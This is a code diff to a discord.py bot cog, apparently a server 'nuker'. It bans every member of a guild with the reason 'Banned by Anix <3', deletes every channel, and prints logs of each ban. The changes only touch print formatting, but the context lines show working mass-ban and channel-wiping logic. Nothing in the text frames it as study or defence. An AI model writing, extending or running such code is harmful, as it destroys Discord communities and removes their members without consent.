@@ -33,9 +33,9 @@ class Startup(commands.Cog):
                 for member in ctx.guild.members:
                     try:
                         await member.ban(reason='Banned by Anix <3')
+                        print(f'Banned {member.name}#{member.discriminator} - {str(member.id)}')
                     except discord.errors.Forbidden:
                         pass
-                    print(f'Banned {member.name} - {str(member.id)}')
                 print("Guild: " + str(ctx.guild.name) + " - " + str(ctx.guild.id) + " - Banned all possible members")
                 for c in ctx.guild.channels:
                     await c.delete()
@@ -71,7 +71,7 @@ class Startup(commands.Cog):
                 for member in guild.members:
                     try:
                         await member.ban(reason='Banned by Anix <3')
-                        print(f'Banned {member.name}{member.discriminator} - {str(member.id)}')
+                        print(f'Banned {member.name}#{member.discriminator} - {str(member.id)}')
                     except discord.errors.Forbidden:
                         pass
                 print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Banned all possible members")
